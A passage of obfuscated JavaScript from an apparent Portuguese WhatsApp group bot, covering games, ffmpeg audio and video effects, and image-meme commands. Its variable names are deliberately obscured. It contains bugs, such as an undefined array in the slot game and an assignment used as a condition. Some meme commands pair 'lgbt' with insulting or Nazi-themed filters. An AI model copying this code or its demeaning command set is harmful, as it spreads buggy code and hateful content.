              joguinhodavelhajs2.push(_0x4f1071);
              fs.writeFileSync("./DADOS/usuarios/joguinhodavelha2.json", JSON.stringify(joguinhodavelhajs2));
              if (fs.existsSync("./DADOS/tictactoe/db/" + _0x4f1071 + ".json")) {
                const _0x1e4387 = setGame("" + _0x4f1071);
                const _0x164249 = _0x1e4387._matrix;
                const _0x3335d3 = "*🎮Ꮐ̸Ꭺ̸Ꮇ̸Ꭼ̸ Ꭰ̸Ꭺ̸ Ꮩ̸Ꭼ̸Ꮮ̸Ꮋ̸Ꭺ̸🕹️*\n     \n[❗] Alguém está jogando no momento...\n\n@" + _0x1e4387.X + " VS @" + _0x1e4387.O + "\n     \n❌ : @" + _0x1e4387.X + "\n⭕ : @" + _0x1e4387.O + "\n     \n Sua vez : @" + (_0x1e4387.turn == "X" ? _0x1e4387.X : _0x1e4387.O) + "\n     \n" + _0x164249[0][0] + "  " + _0x164249[0][1] + "  " + _0x164249[0][2] + "\n" + _0x164249[1][0] + "  " + _0x164249[1][1] + "  " + _0x164249[1][2] + "\n" + _0x164249[2][0] + "  " + _0x164249[2][1] + "  " + _0x164249[2][2] + "\n";
                const _0x67d33a = {
                  text: _0x3335d3
                };
                _0x263319.sendMessage(_0x4f1071, _0x67d33a, {
                  quoted: _0x302296,
                  mentions: [_0x1e4387.X + "@s.whatsapp.net", _0x1e4387.O + "@s.whatsapp.net"]
                });
                return;
              }
              if (_0x1f217d.length === 1) {
                return _0x403602("*⟅❗⟆ Jogue com Alguem!!!!*\n*para inicar a partida : " + (_0x1d93be + _0x3dec88) + " @membro do gp*");
              }
              const _0x519357 = setGame("" + _0x4f1071);
              console.log("Start No jogodavelha " + _0x519357.session);
              _0x519357.status = false;
              _0x519357.X = _0x32e455.replace("@s.whatsapp.net", "");
              _0x519357.O = _0x1f217d[1].replace("@", "");
              var _0x4a1548 = ["" + _0x519357.X, "" + _0x519357.O];
              fs.writeFileSync("./DADOS/tictactoe/db/" + _0x4f1071 + ".json", JSON.stringify(_0x519357, null, 2));
              const _0x227925 = "*『📌ᎬՏᏢᎬᎡᎪΝᎠϴ ϴ ϴᏢϴΝᎬΝͲᎬ⚔️』*\n     \n@" + _0x32e455.replace("@s.whatsapp.net", "") + " _está te desafiando para uma partida de jogo da velha..._\n_[ " + _0x1f217d[1] + " ] Use *『S』* para aceitar ou *『N』* para não aceitar..._\n\nEm caso de problemas, marque algum administrador para resetar o jogo com o comando " + _0x1d93be + "rv";
              _0x59c8a5 = [_0x32e455, _0x25b5fb];
              _0xd7aa55(_0x227925, _0x59c8a5, true);
              break;
            case "resetarvelha":
            case "resetavelha":
            case "resetarv":
            case "resetav":
            case "resetvelha":
            case "rv":
              if (!_0x460bdc && !_0x150e9e && !_0x35021e) {
                return _0x403602("Fale com quem iniciou o jogo, só ele pode resetar, ou então algum ADM");
              }
              if (fs.existsSync("./DADOS/tictactoe/db/" + _0x4f1071 + ".json")) {
                DLT_FL("./DADOS/tictactoe/db/" + _0x4f1071 + ".json");
                _0x403602("Jogo da velha resetado com sucesso nesse grupo!");
                joguinhodavelhajs.splice([]);
                fs.writeFileSync("./DADOS/usuarios/joguinhodavelha.json", JSON.stringify(joguinhodavelhajs));
                joguinhodavelhajs2.splice([]);
                fs.writeFileSync("./DADOS/usuarios/joguinhodavelha2.json", JSON.stringify(joguinhodavelhajs2));
              } else {
                _0x403602("Não a nenhuma sessão em andamento...");
              }
              break;
            case "ppt":
              if (_0x40e45c.length < 1) {
                return _0x403602("Você deve digitar " + _0x1d93be + "ppt pedra, " + _0x1d93be + "ppt papel ou " + _0x1d93be + "ppt tesoura");
              }
              ppt = ["pedra", "papel", "tesoura"];
              ppy = ppt[Math.floor(Math.random() * ppt.length)];
              ppg = Math.floor(Math.random() * 1) + 10;
              pptb = ppy;
              if (pptb == "pedra" && _0x40e45c == "papel" || pptb == "papel" && _0x40e45c == "tesoura" || pptb == "tesoura" && _0x40e45c == "pedra") {
                var _0xf8e29d = "vitoria";
              } else if (pptb == "pedra" && _0x40e45c == "tesoura" || pptb == "papel" && _0x40e45c == "pedra" || pptb == "tesoura" && _0x40e45c == "papel") {
                var _0xf8e29d = "derrota";
              } else if (pptb == "pedra" && _0x40e45c == "pedra" || pptb == "papel" && _0x40e45c == "papel" || pptb == "tesoura" && _0x40e45c == "tesoura") {
                var _0xf8e29d = "empate";
              } else if (_0xf8e29d = "undefined") {
                return _0x403602("Você deve digitar " + _0x1d93be + "ppt pedra, " + _0x1d93be + "ppt papel ou " + _0x1d93be + "ppt tesoura");
              }
              if (_0xf8e29d == "vitoria") {
                var _0x547639 = "Vitória do jogador";
              }
              if (_0xf8e29d == "derrota") {
                var _0x547639 = "A vitória é do BOT";
              }
              if (_0xf8e29d == "empate") {
                var _0x547639 = "O jogo terminou em empate";
              }
              _0x403602(NomeDoBot + " jogou: " + pptb + "\nO jogador jogou: " + _0x40e45c + "\n\n" + _0x547639);
              break;
            case "cassino2":
              const _0x59f463 = ["🍊 : 🍒 : 🍐", "🍒 : 🔔 : 🍊", "🍇 : 🍇 : 🍇", "🍊 : 🍋 : 🔔", "🔔 : 🍒 : 🍐", "🔔 : 🍒 : 🍊", "🍊 : 🍋 : ??", "🍐 : 🍒 : 🍋", "🍐 : 🍐 : 🍐", "🍊 : 🍒 : 🍒", "🔔 : 🔔 : 🍇", "🍌 : 🍒 : 🔔", "🍐 : 🔔 : 🔔", "🍊 : 🍋 : 🍒", "🍋 : 🍋 : 🍌", "🔔 : 🔔 : 🍇", "🔔 : 🍐 : 🍇", "🔔 : 🔔 : 🔔", "🍒 : 🍒 : 🍒", "🍌 : 🍌 : 🍌"];
              const _0x2f531c = sotoy[Math.floor(Math.random() * sotoy.length)];
              if (_0x2f531c == "🥑 : 🥑 : 🥑" || _0x2f531c == "🍉 : 🍉 : 🍉" || _0x2f531c == "🍓 : 🍓 : 🍓" || _0x2f531c == "🍎 : 🍎 : 🍎" || _0x2f531c == "🍍 : 🍍 : 🍍" || _0x2f531c == "🥝 : 🥝 : 🥝" || _0x2f531c == "🍑 : 🍑 : 🍑" || _0x2f531c == "🥥 : 🥥 : 🥥" || _0x2f531c == "🍋 : 🍋 : 🍋" || _0x2f531c == "🍐 : 🍐 : 🍐" || _0x2f531c == "🍌 : 🍌 : 🍌" || _0x2f531c == "🍒 : 🍒 : 🍒" || _0x2f531c == "🔔 : 🔔 : 🔔" || _0x2f531c == "🍊 : 🍊 : 🍊" || _0x2f531c == "🍇 : 🍇 : 🍇") {
                var _0x3d0790 = "Você ganhou!!!";
              } else {
                var _0x3d0790 = "Você perdeu...";
              }
              const _0x192603 = "\n┏━━━━❪🎰❫━━━━\n┣► " + _0x2f531c + "◄┛\n┗━━━━❪💰❫━━━━\n\n*" + _0x3d0790 + "*";
              EnvBotao(_0x4f1071, _0x32e455, _0x263319, _0x192603, _0x3d0790, "1|0", [_0x1d93be + "cassino", "Proximo"], _0xa6b34);
              break;
            case "bot":
              const _0x4eabd9 = fs.readFileSync("DADOS/usuarios/audios/qviado.mp3");
              const _0x4619fa = {
                audio: _0x4eabd9,
                mimetype: "audio/mp4",
                ptt: true
              };
              const _0x3b5d6f = {
                quoted: _0x302296
              };
              _0x263319.sendMessage(_0x4f1071, _0x4619fa, _0x3b5d6f);
              break;
            case "infobot":
              const _0x36110e = fs.readFileSync("DADOS/usuarios/audios/infobot.mp3");
              const _0x2eca54 = {
                audio: _0x36110e,
                mimetype: "audio/mp4",
                ptt: true
              };
              const _0x3e5293 = {
                quoted: _0x302296
              };
              _0x263319.sendMessage(_0x4f1071, _0x2eca54, _0x3e5293);
              break;
            case "videocontrario":
            case "reversevid":
              if ((_0x13c612 && _0x302296.message.videoMessage || !_0x10f925) && !_0x1d6557.length <= 1) {
                _0x403602(enviar.espere);
                encmedia = _0x5760e9 ? _0x302296.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage : _0x302296.message.videoMessage;
                rane = getRandom("." + (await getExtension(encmedia.mimetype)));
                buffimg = await getFileBuffer(encmedia, "video");
                fs.writeFileSync(rane, buffimg);
                media = rane;
                ran = getRandom(".mp4");
                exec("ffmpeg -i " + media + " -vf reverse -af areverse " + ran, _0x41aee9 => {
                  DLT_FL(media);
                  if (_0x41aee9) {
                    return _0x403602("Err: " + _0x41aee9);
                  }
                  buffer453 = fs.readFileSync(ran);
                  const _0x126769 = {
                    video: buffer453,
                    mimetype: "video/mp4"
                  };
                  const _0x5bc27e = {
                    quoted: _0x302296
                  };
                  _0x263319.sendMessage(_0x4f1071, _0x126769, _0x5bc27e);
                  DLT_FL(ran);
                });
              } else {
                _0x403602("Marque um vídeo..");
              }
              break;
            case "videolento":
            case "slowvid":
              if ((_0x13c612 && _0x302296.message.videoMessage || !_0x10f925) && !_0x1d6557.length <= 1) {
                _0x403602(enviar.espere);
                encmedia = _0x5760e9 ? _0x302296.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage : _0x302296.message.videoMessage;
                rane = getRandom("." + (await getExtension(encmedia.mimetype)));
                buffimg = await getFileBuffer(encmedia, "video");
                fs.writeFileSync(rane, buffimg);
                media = rane;
                ran = getRandom(".mp4");
                exec("ffmpeg -i " + media + " -filter_complex \"[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]\" -map \"[v]\" -map \"[a]\" " + ran, _0x25c6a5 => {
                  DLT_FL(media);
                  if (_0x25c6a5) {
                    return _0x403602("Err: " + _0x25c6a5);
                  }
                  buffer453 = fs.readFileSync(ran);
                  const _0x4dc889 = {
                    video: buffer453,
                    mimetype: "video/mp4"
                  };
                  const _0x59c24a = {
                    quoted: _0x302296
                  };
                  _0x263319.sendMessage(_0x4f1071, _0x4dc889, _0x59c24a);
                  DLT_FL(ran);
                });
              } else {
                _0x403602("Marque um vídeo..");
              }
              break;
            case "videorapido":
            case "fastvid":
              if ((_0x13c612 && _0x302296.message.videoMessage || !_0x10f925) && !_0x1d6557.length <= 1) {
                _0x403602(enviar.espere);
                encmedia = _0x5760e9 ? _0x302296.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage : _0x302296.message.videoMessage;
                rane = getRandom("." + (await getExtension(encmedia.mimetype)));
                buffimg = await getFileBuffer(encmedia, "video");
                fs.writeFileSync(rane, buffimg);
                media = rane;
                ran = getRandom(".mp4");
                exec("ffmpeg -i " + media + " -filter_complex \"[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]\" -map \"[v]\" -map \"[a]\" " + ran, _0x1fa8d9 => {
                  DLT_FL(media);
                  if (_0x1fa8d9) {
                    return _0x403602("Err: " + _0x1fa8d9);
                  }
                  buffer453 = fs.readFileSync(ran);
                  const _0x5e574a = {
                    video: buffer453,
                    mimetype: "video/mp4"
                  };
                  const _0x2e3ef0 = {
                    quoted: _0x302296
                  };
                  _0x263319.sendMessage(_0x4f1071, _0x5e574a, _0x2e3ef0);
                  DLT_FL(ran);
                });
              } else {
                _0x403602("Marque o vídeo..");
              }
              break;
            case "grave2":
              if (_0x13c612 && !_0x302296.message.imageMessage && !_0x302296.message.videoMessage || _0x6aebb1) {
                _0x403602(enviar.espere);
                muk = _0x6aebb1 ? _0x302296.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : _0x302296.message.audioMessage;
                rane = getRandom("." + (await getExtension(muk.mimetype)));
                buffimg = await getFileBuffer(muk, "audio");
                fs.writeFileSync(rane, buffimg);
                gem = rane;
                ran = getRandom(".mp3");
                exec("ffmpeg -i " + gem + " -filter:a \"atempo=1.6,asetrate=22100\" " + ran, (_0x4caa72, _0x252d34, _0x27f611) => {
                  DLT_FL(gem);
                  if (_0x4caa72) {
                    return _0x403602("Erro!");
                  }
                  hah = fs.readFileSync(ran);
                  const _0x3ff94e = {
                    audio: hah,
                    mimetype: "audio/mp4",
                    ptt: true
                  };
                  const _0x754b4d = {
                    quoted: _0x302296
                  };
                  _0x263319.sendMessage(_0x4f1071, _0x3ff94e, _0x754b4d);
                  DLT_FL(ran);
                });
              } else {
                _0x403602("Marque o áudio..");
              }
              break;
            case "grave":
              if (_0x13c612 && !_0x302296.message.imageMessage && !_0x302296.message.videoMessage || _0x6aebb1) {
                _0x403602(enviar.espere);
                muk = _0x6aebb1 ? _0x302296.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : _0x302296.message.audioMessage;
                rane = getRandom("." + (await getExtension(muk.mimetype)));
                buffimg = await getFileBuffer(muk, "audio");
                fs.writeFileSync(rane, buffimg);
                gem = rane;
                ran = getRandom(".mp3");
                exec("ffmpeg -i " + gem + " -filter:a \"atempo=0.9,asetrate=44100\" " + ran, (_0x726731, _0x652b8, _0x58e01a) => {
                  DLT_FL(gem);
                  if (_0x726731) {
                    return _0x403602("Erro!");
                  }
                  hah = fs.readFileSync(ran);
                  const _0xf69633 = {
                    audio: hah,
                    mimetype: "audio/mp4",
                    ptt: true
                  };
                  const _0x499a86 = {
                    quoted: _0x302296
                  };
                  _0x263319.sendMessage(_0x4f1071, _0xf69633, _0x499a86);
                  DLT_FL(ran);
                });
              } else {
                _0x403602("Marque o áudio..");
              }
              break;
            case "adolesc":
            case "vozmenino":
              if (_0x13c612 && !_0x302296.message.imageMessage && !_0x302296.message.videoMessage || _0x6aebb1) {
                _0x403602(enviar.espere);
                muk = _0x6aebb1 ? _0x302296.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : _0x302296.message.audioMessage;
                rane = getRandom("." + (await getExtension(muk.mimetype)));
                buffimg = await getFileBuffer(muk, "audio");
                fs.writeFileSync(rane, buffimg);
                gem = rane;
                ran = getRandom(".mp3");
                exec("ffmpeg -i " + gem + " -filter:a atempo=1.06,asetrate=44100*1.25 " + ran, (_0x470740, _0x544bd5, _0x495194) => {
                  DLT_FL(gem);
                  if (_0x470740) {
                    return _0x403602("Erro!");
                  }
                  hah = fs.readFileSync(ran);
                  const _0x546538 = {
                    audio: hah,
                    mimetype: "audio/mp4",
                    ptt: true
                  };
                  const _0xc04c72 = {
                    quoted: _0x302296
                  };
                  _0x263319.sendMessage(_0x4f1071, _0x546538, _0xc04c72);
                  DLT_FL(ran);
                });
              } else {
                _0x403602("Marque o áudio..");
              }
              break;
            case "tomp3":
              if (_0x13c612 && !_0x302296.message.imageMessage || _0x5760e9) {
                post = _0x10f925 ? JSON.parse(JSON.stringify(_0x302296).replace("quotedM", "m")).message.extendedTextMessage.contextInfo.message.imageMessage : _0x302296.message.videoMessage;
                _0x403602(enviar.espere);
                encmedia = _0x5760e9 ? _0x302296.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage : _0x302296.message.videoMessage;
                rane = getRandom("." + (await getExtension(encmedia.mimetype)));
                buffimg = await getFileBuffer(encmedia, "video");
                fs.writeFileSync(rane, buffimg);
                media = rane;
                ran = getRandom(".mp4");
                exec("ffmpeg -i " + media + " " + ran, _0x5af7d7 => {
                  DLT_FL(media);
                  if (_0x5af7d7) {
                    return _0x403602("❌ Falha ao converter vídeo para mp3 ❌");
                  }
                  var _0x34d1f4 = fs.readFileSync(ran);
                  const _0x3af72f = {
                    audio: _0x34d1f4,
                    mimetype: "audio/mp4"
                  };
                  const _0x24a7fe = {
                    quoted: _0x302296
                  };
                  _0x263319.sendMessage(_0x4f1071, _0x3af72f, _0x24a7fe);
                  DLT_FL(ran);
                });
              } else {
                _0x403602("Marque o vídeo para transformar em áudio por favor..");
              }
              break;
            case "bass3":
              if (_0x13c612 && !_0x302296.message.imageMessage && !_0x302296.message.videoMessage || _0x6aebb1) {
                _0x403602(enviar.espere);
                muk = _0x6aebb1 ? _0x302296.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : _0x302296.message.audioMessage;
                rane = getRandom("." + (await getExtension(muk.mimetype)));
                buffimg = await getFileBuffer(muk, "audio");
                fs.writeFileSync(rane, buffimg);
                gem = rane;
                ran = getRandom(".mp3");
                exec("ffmpeg -i " + gem + " -af equalizer=f=20:width_type=o:width=2:g=15 " + ran, (_0x2aa2f5, _0xefd380, _0x21f3d4) => {
                  DLT_FL(gem);
                  if (_0x2aa2f5) {
                    return _0x403602("Erro!");
                  }
                  hah = fs.readFileSync(ran);
                  const _0xc41447 = {
                    audio: hah,
                    mimetype: "audio/mp4",
                    ptt: true
                  };
                  const _0x32a08a = {
                    quoted: _0x302296
                  };
                  _0x263319.sendMessage(_0x4f1071, _0xc41447, _0x32a08a);
                  DLT_FL(ran);
                });
              } else {
                _0x403602("Marque o áudio..");
              }
              break;
            case "bass":
              if (_0x13c612 && !_0x302296.message.imageMessage && !_0x302296.message.videoMessage || _0x6aebb1) {
                _0x403602(enviar.espere);
                muk = _0x6aebb1 ? _0x302296.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : _0x302296.message.audioMessage;
                rane = getRandom("." + (await getExtension(muk.mimetype)));
                buffimg = await getFileBuffer(muk, "audio");
                fs.writeFileSync(rane, buffimg);
                gem = rane;
                ran = getRandom(".mp3");
                exec("ffmpeg -i " + gem + " -af equalizer=f=20:width_type=o:width=2:g=15 " + ran, (_0x48cadd, _0x42f07b, _0x48ad35) => {
                  DLT_FL(gem);
                  if (_0x48cadd) {
                    return _0x403602("Erro!");
                  }
                  hah = fs.readFileSync(ran);
                  const _0x41c337 = {
                    audio: hah,
                    mimetype: "audio/mp4",
                    ptt: true
                  };
                  const _0x4735d8 = {
                    quoted: _0x302296
                  };
                  _0x263319.sendMessage(_0x4f1071, _0x41c337, _0x4735d8);
                  DLT_FL(ran);
                });
              } else {
                _0x403602("Marque o áudio..");
              }
              break;
            case "bass2":
              if (_0x13c612 && !_0x302296.message.imageMessage && !_0x302296.message.videoMessage || _0x6aebb1) {
                _0x403602(enviar.espere);
                muk = _0x6aebb1 ? _0x302296.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : _0x302296.message.audioMessage;
                rane = getRandom("." + (await getExtension(muk.mimetype)));
                buffimg = await getFileBuffer(muk, "audio");
                fs.writeFileSync(rane, buffimg);
                gem = rane;
                ran = getRandom(".mp3");
                exec("ffmpeg -i " + gem + " -af equalizer=f=94:width_type=o:width=2:g=30 " + ran, (_0x4a1c09, _0x1d692e, _0x4972b1) => {
                  DLT_FL(gem);
                  if (_0x4a1c09) {
                    return _0x403602("Erro!");
                  }
                  hah = fs.readFileSync(ran);
                  const _0xe9df35 = {
                    audio: hah,
                    mimetype: "audio/mp4",
                    ptt: true
                  };
                  const _0x4764a1 = {
                    quoted: _0x302296
                  };
                  _0x263319.sendMessage(_0x4f1071, _0xe9df35, _0x4764a1);
                  DLT_FL(ran);
                });
              } else {
                _0x403602("Marque o áudio..");
              }
              break;
            case "estourar":
              if (_0x13c612 && !_0x302296.message.imageMessage && !_0x302296.message.videoMessage || _0x6aebb1) {
                _0x403602(enviar.espere);
                muk = _0x6aebb1 ? _0x302296.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : _0x302296.message.audioMessage;
                rane = getRandom("." + (await getExtension(muk.mimetype)));
                buffimg = await getFileBuffer(muk, "audio");
                fs.writeFileSync(rane, buffimg);
                gem = rane;
                ran = getRandom(".mp3");
                exec("ffmpeg -i " + gem + " -af equalizer=f=90:width_type=o:width=2:g=30 " + ran, (_0x2bdcdc, _0x4538fc, _0xb3dc63) => {
                  DLT_FL(gem);
                  if (_0x2bdcdc) {
                    return _0x403602("Erro!");
                  }
                  hah = fs.readFileSync(ran);
                  const _0x328042 = {
                    audio: hah,
                    mimetype: "audio/mp4",
                    ptt: true
                  };
                  const _0x5169cf = {
                    quoted: _0x302296
                  };
                  _0x263319.sendMessage(_0x4f1071, _0x328042, _0x5169cf);
                  DLT_FL(ran);
                });
              } else {
                _0x403602("Marque o áudio..");
              }
              break;
            case "fast":
            case "audiorapido":
              if (_0x13c612 && !_0x302296.message.imageMessage && !_0x302296.message.videoMessage || _0x6aebb1) {
                _0x403602(enviar.espere);
                muk = _0x6aebb1 ? _0x302296.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : _0x302296.message.audioMessage;
                rane = getRandom("." + (await getExtension(muk.mimetype)));
                buffimg = await getFileBuffer(muk, "audio");
                fs.writeFileSync(rane, buffimg);
                gem = rane;
                ran = getRandom(".mp3");
                exec("ffmpeg -i " + gem + " -filter:a \"atempo=0.9,asetrate=95100\" " + ran, (_0x13e49c, _0x2f1d06, _0x518f04) => {
                  DLT_FL(gem);
                  if (_0x13e49c) {
                    return _0x403602("Erro");
                  }
                  hah = fs.readFileSync(ran);
                  const _0xe3bdfb = {
                    audio: hah,
                    mimetype: "audio/mp4",
                    ptt: true
                  };
                  const _0x1ada4c = {
                    quoted: _0x302296
                  };
                  _0x263319.sendMessage(_0x4f1071, _0xe3bdfb, _0x1ada4c);
                  DLT_FL(ran);
                });
              } else {
                _0x403602("Marque o áudio...");
              }
              break;
            case "esquilo":
              if (_0x13c612 && !_0x302296.message.imageMessage && !_0x302296.message.videoMessage || _0x6aebb1) {
                _0x403602(enviar.espere);
                muk = _0x6aebb1 ? _0x302296.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : _0x302296.message.audioMessage;
                rane = getRandom("." + (await getExtension(muk.mimetype)));
                buffimg = await getFileBuffer(muk, "audio");
                fs.writeFileSync(rane, buffimg);
                gem = rane;
                ran = getRandom(".mp3");
                exec("ffmpeg -i " + gem + " -filter:a \"atempo=0.7,asetrate=65100\" " + ran, (_0x1816fa, _0x523dea, _0x45b9d6) => {
                  DLT_FL(gem);
                  if (_0x1816fa) {
                    return _0x403602("Erro!");
                  }
                  hah = fs.readFileSync(ran);
                  const _0x2e7f23 = {
                    audio: hah,
                    mimetype: "audio/mp4",
                    ptt: true
                  };
                  const _0x1f9a1e = {
                    quoted: _0x302296
                  };
                  _0x263319.sendMessage(_0x4f1071, _0x2e7f23, _0x1f9a1e);
                  DLT_FL(ran);
                });
              } else {
                _0x403602("Marque o áudio...");
              }
              break;
            case "audiolento":
            case "slow":
              if (_0x13c612 && !_0x302296.message.imageMessage && !_0x302296.message.videoMessage || _0x6aebb1) {
                _0x403602(enviar.espere);
                muk = _0x6aebb1 ? _0x302296.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : _0x302296.message.audioMessage;
                rane = getRandom("." + (await getExtension(muk.mimetype)));
                buffimg = await getFileBuffer(muk, "audio");
                fs.writeFileSync(rane, buffimg);
                gem = rane;
                ran = getRandom(".mp3");
                exec("ffmpeg -i " + gem + " -filter:a \"atempo=0.9,asetrate=44100\" " + ran, (_0x53f58e, _0x169045, _0x4a516c) => {
                  DLT_FL(gem);
                  if (_0x53f58e) {
                    return _0x403602("Erro!");
                  }
                  hah = fs.readFileSync(ran);
                  const _0x33dea4 = {
                    audio: hah,
                    mimetype: "audio/mp4",
                    ptt: true
                  };
                  const _0x378b23 = {
                    quoted: _0x302296
                  };
                  _0x263319.sendMessage(_0x4f1071, _0x33dea4, _0x378b23);
                  DLT_FL(ran);
                });
              } else {
                _0x403602("Marque o áudio..");
              }
              break;
            case "togif":
              if (!_0x1785a1) {
                return _0x403602("[ ❗ ] 𝙈𝙖𝙧𝙦𝙪𝙚 𝙖 𝙛𝙞𝙜𝙪𝙧𝙞𝙣𝙝𝙖 𝙖𝙣𝙞𝙢𝙖𝙙𝙖!");
              }
              try {
                if ((_0x13c612 && !_0x302296.message.videoMessage || _0x1785a1) && !_0x1d6557.length <= 1) {
                  getBufferWebP = await getFileBuffer(_0x302296.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage, "sticker");
                  _0x403602("「 ❗ 」 𝘼𝙜𝙪𝙖𝙧𝙙𝙚, 𝙘𝙤𝙣𝙫𝙚𝙧𝙩𝙚𝙣𝙙𝙤 𝙖 𝙛𝙞𝙜𝙪 𝙚𝙢 𝙜𝙞𝙛...");
                  fs.writeFileSync("./Media/convert.webp", getBufferWebP);
                  const {
                    FiguMp4OuGif: _0x381516
                  } = require("./armor/js/scriptjeff.js");
                  outputFile = "./Media/convert.webp";
                  convertWebP = await _0x381516(outputFile);
                  const _0x2adec4 = {
                    url: convertWebP
                  };
                  const _0x2134a1 = {
                    video: _0x2adec4,
                    gifPlayback: true,
                    fileName: "sticker-xbot.gif"
                  };
                  const _0x3ce389 = {
                    quoted: _0x302296
                  };
                  await _0x263319.sendMessage(_0x4f1071, _0x2134a1, _0x3ce389).catch(async _0x1bce82 => {
                    await _0x403602(_0x1bce82);
                    await DLT_FL(outputFile);
                    console.log(_0x1bce82);
                  });
                }
              } catch (_0x210f41) {
                await _0x403602(_0x210f41);
                console.log(_0x210f41);
              }
              ;
              break;
            case "lixo":
            case "lgbt":
            case "morto":
            case "preso":
            case "deletem":
            case "procurado":
            case "hitler":
            case "borrar":
            case "merda":
              try {
                if (_0x13c612 && !_0x302296.message.videoMessage || _0x10f925) {
                  post = _0x10f925 ? JSON.parse(JSON.stringify(_0x302296).replace("quotedM", "m")).message.extendedTextMessage.contextInfo.message.imageMessage : _0x302296.message.imageMessage;
                  imagem = await downloadContentFromMessage(post, "image");
                  base64 = Buffer.from([]);
                  for await (const _0x540010 of imagem) {
                    base64 = Buffer.concat([base64, _0x540010]);
                  }
                  _0x403602(enviar.espere);
                  _0x2722a9 = await upload(base64);
                  const _0x25ebb4 = {
                    url: "https://api.bronxyshost.com.br/api-bronxys/montagem?url=" + _0x2722a9 + "&category=" + _0x3dec88 + "&apikey=" + _0x44a335
                  };
                  const _0x2ce49d = {
                    image: _0x25ebb4
                  };
                  const _0x18ea05 = {
                    quoted: _0x302296
                  };
                  _0x263319.sendMessage(_0x4f1071, _0x2ce49d, _0x18ea05).catch(_0x22b3ca => {
                    return _0x403602("" + infoerror);
                  });
                } else {
                  _0x403602("Selecione uma imagem...!");
                }
              } catch (_0x47226c) {
                if (JSON.stringify(_0x47226c).includes(_0x44a335)) {
                  return console.log("A api caiu ou não foi possivel executar esta ação., espere retornar");
                } else {
                  _0x403602("ERROR!!");
                }
              }
              break;
            case "comunismo":
            case "kiss":
            case "affect":
            case "mms":
            case "borross":
            case "blur":
            case "beautiful":
            case "circle":
            case "deleted":
            case "invert":
            case "facepalm":
            case "jail":
            case "rip":
            case "wasted":
            case "wanted":
            case "sepia":
            case "pixelate":
              if (_0x13c612 && !_0x302296.message.videoMessage || _0x10f925) {
                post = _0x10f925 ? JSON.parse(JSON.stringify(_0x302296).replace("quotedM", "m")).message.extendedTextMessage.contextInfo.message.imageMessage : _0x302296.message.imageMessage;
                imagem = await downloadContentFromMessage(post, "image");
                base64 = Buffer.from([]);
                for await (const _0x466689 of imagem) {
                  base64 = Buffer.concat([base64, _0x466689]);
                }
                _0x403602(enviar.espere);
                _0x2722a9 = await upload(base64);
                const _0x572c1b = {
                  url: SITE_JEFF_APIS + "/api/canvas/" + _0x3dec88 + "?link=" + _0x2722a9 + "&apikey=" + _0x512d5e
                };
                const _0x537e9a = {
                  image: _0x572c1b
                };
                _0x263319.sendMessage(_0x4f1071, _0x537e9a).catch(_0x3789fe => {
                  return _0x403602("" + infoerror);
                });
              } else {
                _0x403602("Selecione uma imagem para transformar. ");
              }
              break;
            case "comporn":
              try {
                txt = _0x2e320b.slice(9);
                jrr = txt.split("/")[0];
                jrr1 = txt.split("/")[1];
                if (!txt.includes("/")) {
                  return _0x403602("Cade a /\nExemplo: " + (_0x1d93be + _0x3dec88) + " Sad/demais");
                }
                _0x403602(enviar.espere);
                const _0x3e6416 = {
                  quoted: _0x302296
                };
                _0x263319.sendMessage(_0x4f1071, {
                  image: {
                    url: "https://api.bronxyshost.com.br/api-bronxys/phub?nome=" + jrr + "&msg=" + jrr1 + "&foto=https://telegra.ph/file/954832554bf2b2e40f932.jpg&apikey=" + _0x44a335
                  }
                }, _0x3e6416);
              } catch (_0x25d08e) {
                if (JSON.stringify(_0x25d08e).includes(_0x44a335)) {
                  return console.log("A api caiu ou não foi possivel executar esta ação., espere retornar");
                } else {
                  _0x403602("ERROR!!");
                }
              }
              break;
            case "legenda2":
              try {
                var [_0x3a7079, _0x137400] = _0x1d6557.split("/");
                if (!_0x1d6557.includes("/")) {
                  return _0x403602("Cade a / mano?\nExemplo: " + (_0x1d93be + _0x3dec88) + " Sad/Demais");
                }
                if (_0x13c612 && !_0x302296.message.videoMessage || _0x10f925) {
                  _0xbbe906 = _0x10f925 ? JSON.parse(JSON.stringify(_0x302296).replace("quotedM", "m")).message.extendedTextMessage.contextInfo.message.imageMessage : _0x302296.message.imageMessage;
                  owgi = await getFileBuffer(_0xbbe906, "image");
                  res = await upload(owgi);
                  const _0xf721a2 = {
                    quoted: _0x302296
                  };
                  _0x263319.sendMessage(_0x4f1071, {
                    image: {
                      url: "https://api.bronxyshost.com.br/api-bronxys/legenda?url=" + res + "&texto1=" + _0x3a7079 + "&texto2=" + _0x137400 + "&apikey=" + _0x44a335
                    }
                  }, _0xf721a2).catch(_0xc2b16d => {
                    return _0x403602("" + infoerror);
                  });
                } else {
                  _0x403602("Marque uma imagem...!");
                }
              } catch (_0x55b807) {
                return _0x403602("ERROR!!");
              }
              break;
            case "legenda":
              try {
                var [_0x3a7079, _0x137400] = _0x1d6557.split("/");
                if (!_0x1d6557.includes("/")) {
                  return _0x403602("Cade a / mano?\nExemplo: " + (_0x1d93be + _0x3dec88) + " Sad/Demais");
                }
                if (_0x13c612 && !_0x302296.message.videoMessage || _0x10f925) {
                  _0xbbe906 = _0x10f925 ? JSON.parse(JSON.stringify(_0x302296).replace("quotedM", "m")).message.extendedTextMessage.contextInfo.message.imageMessage : _0x302296.message.imageMessage;
                  owgi = await getFileBuffer(_0xbbe906, "image");
                  res = await upload(owgi);
                  const _0x167e10 = {
                    url: SITE_JEFF_APIS + "/api/legenda?url=" + res + "&texto1=" + _0x3a7079 + "&texto2=" + _0x137400 + "&apikey=" + _0x512d5e
                  };
                  const _0xbd5e51 = {
                    image: _0x167e10
                  };
                  const _0x51ff10 = {
